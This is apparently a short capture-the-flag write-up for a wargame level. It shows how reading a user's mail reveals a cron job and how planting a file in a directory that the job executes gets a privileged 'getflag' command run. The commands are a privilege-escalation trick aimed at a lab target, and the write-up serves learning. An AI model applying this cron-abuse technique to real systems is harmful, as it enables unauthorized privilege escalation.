When you log in you can see that you have a mail. Go to `/var/mail` and there is a mail with a cronjob:

``` shell
cat /var/mail/level05 
```

If you go to the path shown in the cronjob you find the script `/usr/sbin/openarenaserver`, let's see what's inside:

``` shell
cat /usr/sbin/openarenaserver
```

This script is executing all files inside `/opt/openarenaserver`, then if we put a file that executes `getflag` and save it on another file you only need to wait for the `openarenaserver` to execute that file.

``` shell
echo "getflag > /tmp/password" > /opt/openarenaserver/execute.me
```

Then you get:

``` shell
cat /tmp/password
```

